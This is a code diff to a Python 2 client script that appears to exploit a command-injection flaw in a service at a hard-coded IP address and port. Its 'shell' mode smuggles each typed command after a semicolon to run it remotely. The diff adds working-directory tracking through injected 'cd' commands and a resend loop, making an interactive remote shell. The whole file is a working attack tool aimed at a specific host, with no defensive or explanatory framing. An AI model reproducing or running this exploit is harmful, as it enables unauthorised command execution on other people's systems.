@@ -3,6 +3,7 @@
 import socket
 import sys
 import os
+import time
 
 HOST = "142.93.118.186"
 PORT = 45
@@ -18,7 +19,6 @@ while True:
     to_send = raw_input("$ ")
 
     if to_send == "quit":
-        s.close()
         sys.exit(0)
 
     elif "pull" in to_send:
@@ -34,15 +34,28 @@ while True:
         print helptext
 
     elif "shell" == to_send:
+        cwd = '/'
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
             s.recv(1024)
-            to_send = raw_input("<remote> $ ")
+            to_send = raw_input("[remote] %s $ " % cwd)
+            to_send_final = to_send
+
             if to_send == "exit":
                 break
-            s.send("; %s\n" % to_send)
-            print s.recv(1024)
+                
+            elif "cd " in to_send:
+                cwd = to_send.split()[1]
+                continue
+                
+            s.send("; cd %s ; %s\n" % (cwd, to_send_final))
+
+            ret = s.recv(1024)
+            while "Panel" in ret:
+                s.send("; cd %s ; %s\n" % (cwd, to_send_final))
+                ret = s.recv(1024)
+            print ret
             s.close()
     else:
         print helptext
